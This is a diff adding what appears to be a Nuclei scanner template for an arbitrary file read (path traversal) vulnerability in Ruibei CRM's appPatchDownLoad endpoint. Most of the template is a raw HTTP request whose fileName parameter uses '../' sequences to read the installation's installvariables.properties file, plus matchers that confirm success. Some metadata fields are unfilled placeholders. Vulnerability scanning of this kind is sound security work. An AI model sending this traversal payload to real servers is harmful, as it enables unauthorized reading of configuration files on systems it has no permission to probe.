@@ -1,0 +1,27 @@
+id: ruibei-fileName-lfi
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 睿贝appPatchDownLoad任意文件读取漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |
+        GET /appPatchDownLoad?fileName=../../../../RebeeCRM/_RebeeCRM_installation/installvariables.properties HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
+        Connection: close
+        Accept-Encoding: gzip, deflate
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'WIN_COMMON_STARTUP'
+      - type: word
+        part: header
+        words:
+          - application/octet-stream
